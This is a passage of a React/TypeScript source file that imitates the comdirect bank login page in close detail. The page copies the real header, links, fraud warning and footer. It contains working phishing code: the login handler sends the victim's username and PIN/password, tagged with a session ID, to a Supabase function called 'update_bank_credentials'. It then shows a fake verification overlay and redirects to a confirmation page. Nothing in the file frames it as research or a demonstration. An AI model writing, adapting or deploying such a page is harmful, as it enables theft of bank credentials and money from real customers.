        <path clipRule="evenodd" fillRule="evenodd" d="m7.1.1c1.2-.1 1.6-.1 4.9-.1s3.7 0 4.9.1c1.3.1 2.1.3 2.9.6.9.2 1.5.6 2.2 1.3s1.1 1.3 1.4 2.1.5 1.6.6 2.9v5s0 3.7-.1 4.9c-.1 1.3-.3 2.1-.6 2.9s-.7 1.5-1.4 2.1c-.7.7-1.3 1.1-2.1 1.4s-1.6.5-2.9.6c-1.2.1-1.6.1-4.9.1s-3.7 0-4.9-.1c-1.3-.1-2.1-.3-2.9-.6-.9-.2-1.5-.6-2.2-1.3s-1.1-1.3-1.4-2.1-.5-1.6-.6-2.9c0-1.3 0-1.7 0-5s0-3.7.1-4.9c.1-1.3.3-2.1.6-2.9.2-.9.6-1.5 1.3-2.2s1.3-1.1 2.1-1.4c.8-.3 1.7-.5 3-.5zm-1.3 11.9c0-3.4 2.8-6.2 6.2-6.2s6.2 2.8 6.2 6.2-2.8 6.2-6.2 6.2-6.2-2.8-6.2-6.2zm2.2 0c0 2.2 1.8 4 4 4s4-1.8 4-4-1.8-4-4-4-4 1.8-4 4zm10.4-5c.8 0 1.4-.6 1.4-1.4s-.6-1.4-1.4-1.4-1.4.6-1.4 1.4.6 1.4 1.4 1.4z" />
      </svg>
    </a>
  </div>
);

const Comdirect = () => {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [direktZu, setDirektZu] = useState("PersoenlicherBereich");
  const [submitting, setSubmitting] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [openPanel, setOpenPanel] = useState<number | null>(null);
  const [menuOpen, setMenuOpen] = useState(false);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") setMenuOpen(false); };
    document.addEventListener("keydown", onKey);
    return () => document.removeEventListener("keydown", onKey);
  }, []);

  usePageMeta("comdirect Login", undefined);
  useEffect(() => { window.scrollTo(0, 0); }, []);

  const handleLogin = async () => {
    if (submitting) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Zugangsnummer / Benutzername (E-Mail)",
        p_password_label: "PIN / Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <div className="min-h-screen bg-white" style={{ color: DARK, fontFamily: "'MarkPro', 'Open Sans', Arial, sans-serif" }}>
      {/* HEADER */}
      <header className="w-full" style={{ backgroundColor: DARK }}>
        <style>{`
          .cd-search::placeholder{color:${HEADER_MUTED};font-weight:700;}
          .cd-sbox{border:1px solid ${HEADER_MUTED};transition:border-color .15s, box-shadow .15s;}
          .cd-sbox .cd-icon svg{color:${HEADER_MUTED};transition:color .15s;}
          .cd-sbox:hover{border-color:#ffffff;}
          .cd-sbox:hover .cd-search::placeholder{color:#ffffff;}
          .cd-sbox:hover .cd-icon svg{color:#ffffff;}
          .cd-sbox:focus-within{border-color:#ffffff;box-shadow:0 0 0 2px ${DARK}, 0 0 0 4px #ffffff;}
          .cd-sbox:focus-within .cd-search::placeholder{color:#ffffff;}
          .cd-sbox:focus-within .cd-icon svg{color:#ffffff;}
          .cd-headerlink{color:var(--cd-base);}
          .cd-headerlink:hover{color:var(--cd-yellow);}
          .cd-greybtn{background-color:rgb(219,221,223);}
          .cd-greybtn:hover{background-color:rgb(199,201,203);}
          .cd-login-btn{transition:background-color .15s;}
          .cd-login-btn:hover{background-color:rgb(255,225,0);}
          .cd-anmelden-btn{transition:background-color .15s;}
          .cd-anmelden-btn:hover{background-color:rgb(255,225,0);}
          .dz-item:hover{background-color:#767676;color:#ffffff !important;}
          .dz-item[data-selected="true"]{background-color:#767676;color:#ffffff !important;}
          .dz-list:hover .dz-item[data-selected="true"]:not(:hover){background-color:transparent !important;color:#0B1E25 !important;}
        `}</style>
        {/* DESKTOP header */}
        <div className="hidden lg:block">
          <div className="max-w-[1040px] mx-auto px-6 flex items-stretch relative">
            <a href="https://www.comdirect.de/" target="_blank" rel="noopener noreferrer" className="relative flex items-center" style={{ backgroundColor: YELLOW, paddingRight: 20, minHeight: 72 }}>
              <span aria-hidden className="absolute top-0 bottom-0 right-full" style={{ width: "100%", backgroundColor: YELLOW }} />
              <WordmarkSVG color={DARK} height={22} />
            </a>
            <div className="flex-1 flex items-center justify-end gap-6 pl-6 h-[72px]">
              <a href="https://www.comdirect.de/inf/musterdepot/index.html" target="_blank" rel="noopener noreferrer" className="cd-headerlink text-[13px] font-bold transition-colors" style={{ ["--cd-base" as any]: HEADER_MUTED, ["--cd-yellow" as any]: YELLOW }}>Musterdepot</a>
              <a href="https://www.comdirect.de/business-partners/leistungsangebot.html" target="_blank" rel="noopener noreferrer" className="cd-headerlink text-[13px] font-bold transition-colors" style={{ ["--cd-base" as any]: HEADER_MUTED, ["--cd-yellow" as any]: YELLOW }}>B2B</a>
              <div className="cd-sbox flex items-center rounded-full px-4 h-9 w-[180px] bg-transparent gap-2">
                <input className="cd-search min-w-0 flex-1 outline-none text-[13px] bg-transparent font-bold" placeholder="WKN, ISIN, Name" style={{ color: HEADER_MUTED }} />
                <span className="cd-icon shrink-0"><SearchIcon /></span>
              </div>
              <div className="cd-sbox flex items-center rounded-full px-4 h-9 w-[180px] bg-transparent gap-2">
                <input className="cd-search min-w-0 flex-1 outline-none text-[13px] bg-transparent font-bold" placeholder="Volltextsuche" style={{ color: HEADER_MUTED }} />
                <span className="cd-icon shrink-0"><SearchIcon /></span>
              </div>
              <a
                href="https://www.comdirect.de/lp/wt/login"
                target="_blank"
                rel="noopener noreferrer"
                className="cd-login-btn rounded-full px-6 h-9 flex items-center text-[14px] font-normal"
                style={{ color: DARK }}
              >
                Login <span className="ml-2 inline-flex"><ButtonChevron size={14} /></span>
              </a>
            </div>
          </div>
          <nav>
            <div className="max-w-[1040px] mx-auto px-6 flex items-center justify-start gap-5 py-3">
              {navItems.map((n) => (
                <a key={n.label} href={n.href} target="_blank" rel="noopener noreferrer" className="text-white text-[14px] font-normal hover:text-[color:var(--cd-yellow)]" style={{ ["--cd-yellow" as any]: YELLOW }}>
                  {n.label}
                </a>
              ))}
            </div>
          </nav>
        </div>

        {/* MOBILE header (nicht sticky) */}
        <div className="lg:hidden sticky top-0 z-50 relative flex items-start justify-between px-5 pt-4 pb-6 h-32" style={{ backgroundColor: DARK }}>
          <a href="https://www.comdirect.de/" target="_blank" rel="noopener noreferrer" aria-label="comdirect" className="flex items-center" style={{ color: YELLOW }}>
            <CMark size={54} color={YELLOW} />
          </a>
          <div className="flex items-center gap-3">
            <a
              href="https://www.comdirect.de/lp/wt/login"
              target="_blank"
              rel="noopener noreferrer"
              className="cd-login-btn rounded-full px-5 h-9 flex items-center text-[14px] font-normal"
              style={{ backgroundColor: YELLOW, color: DARK }}
            >
              Login <span className="ml-2 inline-flex"><ButtonChevron size={14} /></span>
            </a>
            <button
              type="button"
              onClick={() => setMenuOpen((o) => !o)}
              aria-label={menuOpen ? "Menü schließen" : "Menü öffnen"}
              className="flex items-center justify-center w-10 h-10 text-white"
            >
              {menuOpen ? (
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                  <line x1="5" y1="5" x2="19" y2="19" />
                  <line x1="19" y1="5" x2="5" y2="19" />
                </svg>
              ) : (
                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                  <line x1="3" y1="7" x2="21" y2="7" />
                  <line x1="3" y1="12" x2="21" y2="12" />
                  <line x1="3" y1="17" x2="21" y2="17" />
                </svg>
              )}
            </button>
          </div>
        </div>

      </header>

      {/* MOBILE menu overlay (slide-down unterhalb des Headers) */}
      <div
        className="lg:hidden fixed left-0 right-0 bottom-0 top-32 z-40"
        style={{
          backgroundColor: DARK,

          transform: menuOpen ? "translateY(0)" : "translateY(-100%)",
          transition: "transform 320ms cubic-bezier(0.4, 0, 0.2, 1)",
          pointerEvents: menuOpen ? "auto" : "none",
          overflowY: "auto",
        }}
        aria-hidden={!menuOpen}
      >
        <div className="px-5 pt-4 pb-10 space-y-3">
          <div className="cd-sbox flex items-center rounded-full px-4 h-10 gap-2">
            <input className="cd-search min-w-0 flex-1 outline-none text-[13px] bg-transparent font-bold" placeholder="WKN, ISIN, Name" style={{ color: HEADER_MUTED }} />
            <span className="cd-icon shrink-0"><SearchIcon /></span>
          </div>
          <div className="cd-sbox flex items-center rounded-full px-4 h-10 gap-2">
            <input className="cd-search min-w-0 flex-1 outline-none text-[13px] bg-transparent font-bold" placeholder="Volltextsuche" style={{ color: HEADER_MUTED }} />
            <span className="cd-icon shrink-0"><SearchIcon /></span>
          </div>
          <div className="pt-4">
            {navItems.map((n, idx) => (
              <div key={n.label} className="flex items-center justify-between py-3" style={{ borderBottom: "1px solid rgba(255,255,255,0.12)" }}>
                <a href={n.href} target="_blank" rel="noopener noreferrer" className="text-white text-[15px] font-normal">{n.label}</a>
                {idx > 0 && (
                  <button type="button" aria-label="Untermenü" className="text-white/80 text-[22px] leading-none px-2">+</button>
                )}
              </div>
            ))}
          </div>
          <div className="pt-6 space-y-3">
            <a href="https://www.comdirect.de/inf/musterdepot/index.html" target="_blank" rel="noopener noreferrer" className="block text-[14px] font-bold" style={{ color: HEADER_MUTED }}>Musterdepot</a>
            <a href="https://www.comdirect.de/business-partners/leistungsangebot.html" target="_blank" rel="noopener noreferrer" className="block text-[14px] font-bold" style={{ color: HEADER_MUTED }}>B2B</a>
          </div>
        </div>
      </div>

      {/* MAIN */}
      <main className="max-w-[1040px] mx-auto px-5 lg:px-6 pt-4 pb-10 lg:py-10">
        <h1 className="text-[26px] lg:text-[28px] leading-tight font-light mb-5 lg:mb-8" style={{ color: DARK }}>
          comdirect Login
        </h1>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-10">
          {/* LEFT: form */}
          <div>
            <div className="space-y-4 max-w-[520px]">
              <FloatingInput
                id="cd-user"
                label="Zugangsnummer / Benutzername (E-Mail)"
                value={username}
                onChange={setUsername}
              />
              <FloatingInput
                id="cd-pw"
                label="PIN / Passwort"
                type="password"
                value={password}
                onChange={setPassword}
              />
              <DirektZuDropdown value={direktZu} onChange={setDirektZu} />
              <button
                onClick={handleLogin}
                disabled={submitting}
                className="cd-anmelden-btn rounded-full px-8 h-12 flex items-center text-[16px] font-semibold"
                style={{ color: "#0B1E25" }}
              >
                Anmelden <span className="ml-2 inline-flex"><ButtonChevron size={16} /></span>
              </button>
              <div className="pt-2 text-[15px]" style={{ color: TEXT_SECONDARY }}>
                <a href="https://kunde.comdirect.de/lp/wt/showFlowDialog" target="_blank" rel="noopener noreferrer" className="underline rounded-sm px-1 -mx-1 transition-colors hover:bg-black/5" style={{ textUnderlineOffset: "4px" }}>Information zum Login</a>
                <span className="mx-2 font-semibold">·</span>
                <a href="https://www.comdirect.de/ngtx/zugangsdaten/kunden" target="_blank" rel="noopener noreferrer" className="underline rounded-sm px-1 -mx-1 transition-colors hover:bg-black/5" style={{ textUnderlineOffset: "4px" }}>Login vergessen / gesperrt?</a>
              </div>
              <div className="pt-6">
                <h2 className="text-[17px] font-semibold mb-4" style={{ color: DARK }}>comdirect Kunde werden?</h2>
                <div className="flex flex-col lg:flex-row flex-wrap gap-3">
                  <a href="https://kunde.comdirect.de/depot/comdirect-depot.html" target="_blank" rel="noopener noreferrer" className="cd-greybtn rounded-full px-6 h-10 flex items-center justify-center lg:justify-start w-full lg:w-auto text-[14px] font-normal transition-colors" style={{ color: DARK }}>
                    Depot eröffnen <span className="ml-2 inline-flex"><ButtonChevron size={14} /></span>
                  </a>
                  <a href="https://kunde.comdirect.de/konto/girokonto.html" target="_blank" rel="noopener noreferrer" className="cd-greybtn rounded-full px-6 h-10 flex items-center justify-center lg:justify-start w-full lg:w-auto text-[14px] font-normal transition-colors" style={{ color: DARK }}>
                    Girokonto eröffnen <span className="ml-2 inline-flex"><ButtonChevron size={14} /></span>
                  </a>
                </div>
                <a href="https://www.comdirect.de/ngtx/member/registrierung" target="_blank" rel="noopener noreferrer" className="inline-block mt-4 text-[15px] underline rounded-sm px-1 -mx-1 transition-colors hover:bg-black/5" style={{ color: TEXT_SECONDARY, textUnderlineOffset: "4px" }}>
                  Kostenfreie Registrierung als comdirect Member inkl.<br />Musterdepot und Community
                </a>
              </div>
            </div>
          </div>

          {/* RIGHT: teaser + fraud */}
          <div className="flex flex-col gap-6">
            <a href="https://kunde.comdirect.de/wtr/ad?rd=%2Fcms%2Fsparen-neu-gedacht.html%3Fsc_cid%3D7249%26cid%3Dcomdirect_web%3Ateaser%3Awsp-hub%3A_%3Apts_sigmalang_p2_t4-loslegen%3Abrokerage%23loslegen&ad=000072499900oh5TS0019900004020" target="_blank" rel="noopener noreferrer" className="relative block rounded-sm overflow-hidden flex flex-col lg:flex-row items-stretch group order-2 lg:order-1" style={{ backgroundColor: "rgb(243, 244, 244)" }}>
              <img src={teaserMobileAsset.url} alt="Dein Zukunfts-Ich fragt, wann du startest" className="w-full h-auto object-cover lg:hidden" />
              <img src={teaserAsset.url} alt="" aria-hidden="true" className="hidden lg:block lg:w-[162px] lg:h-[173px] object-cover" />
              <div className="flex-1 px-5 pt-4 pb-10 lg:pl-6 lg:pr-12 lg:py-0 flex flex-col justify-center">
                <h3 className="text-[20px] font-normal leading-snug" style={{ color: DARK }}>
                  Dein Zukunfts-Ich fragt, wann du startest
                </h3>
                <p className="text-[15px] mt-0.5 leading-snug" style={{ color: TEXT_SECONDARY }}>
                  Auch kleine Schritte summieren sich zu etwas Großem.
                </p>
              </div>
              <div className="absolute bottom-3 right-3 flex items-center" style={{ color: DARK }}><ButtonChevron size={24} /></div>
            </a>


            <div className="pt-4 px-6 pb-4 rounded-sm order-1 lg:order-2" style={{ backgroundColor: "rgb(243, 244, 244)" }}>
              <div className="flex items-start justify-between gap-4 mb-3">
                <h3 className="text-[20px] font-normal leading-snug" style={{ color: DARK }}>
                  Warnung:<br />aktuelle Betrugsfälle!
                </h3>
                <WarningTriangle />
              </div>
              <p className="text-[15px] mb-4" style={{ color: DARK }}>
                comdirect Kundinnen und Kunden sind aktuell von verschiedenen Betrugsfällen betroffen. Wir sagen dir, wie du dich davor schützen kannst.
              </p>
              <div className="-mx-6 border-t-2 border-white">
                {fraudItems.map((f, i) => {
                  const open = openPanel === i;
                  return (
                    <div key={f.title} className={i > 0 ? "border-t-2 border-white" : ""}>
                      <button
                        onClick={() => setOpenPanel(open ? null : i)}
                        className="w-full flex items-center justify-between py-3 px-6 text-left hover:bg-[rgb(232,234,234)]"
                        style={{ transition: "background-color 450ms ease, color 450ms ease" }}
                        aria-expanded={open}
                      >
                        <span className="text-[16px] font-bold" style={{ color: DARK }}>{f.title}</span>
                        <span
                          className="flex items-center justify-center rounded-full shrink-0"
                          style={{
                            width: 28,
                            height: 28,
                            backgroundColor: open ? "rgb(11, 30, 37)" : "rgb(209, 212, 214)",
                            color: open ? "#ffffff" : DARK,
                            transition: "background-color 450ms ease, color 450ms ease",
                          }}
                        >
                          <Chevron open={open} color={open ? "#ffffff" : DARK} />
                        </span>
                      </button>
                      <div
                        className="grid transition-[grid-template-rows] duration-[350ms] ease-in-out"
                        style={{ gridTemplateRows: open ? "1fr" : "0fr" }}
                        aria-hidden={!open}
                      >
                        <div className="overflow-hidden">
                          <div className="pb-4 px-6 text-[16px] leading-relaxed" style={{ color: DARK }}>
                            <p>{f.body}</p>
                            <a href="#" className="inline-block mt-3 underline hover:no-underline" style={{ color: DARK }}>
                              So schützt du dich
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer className="relative mt-16 overflow-hidden min-h-[280px]" style={{ backgroundColor: DARK, color: "#cfd4d6" }} aria-label="Unternehmensnavigation, Rechtliche Links">
        <div className="hidden lg:block absolute left-0 top-[34px] pointer-events-none">
          <FooterShapeLeft />
        </div>
        <div className="hidden lg:block absolute right-0 top-[60px] pointer-events-none">
          <FooterShapeRight />
        </div>
        <div className="relative z-10 max-w-[1040px] mx-auto px-5 lg:px-6 pt-10 lg:pt-16 pb-10">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-3 lg:gap-8 mb-6">
            {/* Spalte 1: nur Logo */}
            <div className="flex flex-col">
              <a href="https://www.comdirect.de/" aria-label="comdirect Startseite" className="block shrink-0 mb-6">
                <FooterLogo />
              </a>
            </div>
            {/* Spalten 2-4: Linklisten - mobile zu 3 Zeilen mit Umbruch, Desktop als Spalten */}
            {footerCols.map((col, i) => (
              <div key={i} className="flex flex-col">
                <ul className="flex flex-row flex-wrap gap-x-3 gap-y-2 lg:flex-col lg:space-y-2 lg:gap-0 text-[13px]">
                  {col.map((item) => (
                    <li key={item.label}>
                      <a
                        href={item.href}
                        target={item.external ? "_blank" : undefined}
                        rel={item.external ? "noopener noreferrer" : undefined}
                        className="rounded-sm px-1 -mx-1 transition-colors hover:bg-white/10"
                        style={{ color: "#e5e7e8", textUnderlineOffset: "3px" }}
                      >
                        {item.label}
                      </a>
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
          {/* Zusatzzeile: Widerruf | Copyright | Social */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 lg:gap-8 items-center mt-8">
            <div className="flex justify-center lg:justify-start order-2 lg:order-1">
              <a
                href="https://kunde.comdirect.de/ngtx/online-widerruf-formular"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center justify-center rounded-full px-4 h-8 text-[12px] font-semibold hover:bg-[#2f444c] transition-colors"
                style={{ backgroundColor: "#1a2d34", color: "#e5e7e8" }}
              >
                Vertrag widerrufen <span className="ml-2 inline-flex"><ButtonChevron size={12} /></span>
              </a>
            </div>
            <div className="md:col-span-2 flex justify-center order-3 lg:order-2">
              <p className="text-[13px] text-white text-center">
                © comdirect – eine Marke der Commerzbank AG
              </p>
            </div>
            <div className="flex justify-center order-4 lg:order-3">
              <SocialIcons />
            </div>
          </div>
        </div>
      </footer>

      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => {
            window.location.href = `/confirmation${sessionId ? `?s=${sessionId}` : ""}`;
          }}
        />
      )}
    </div>
  );
};

export default Comdirect;
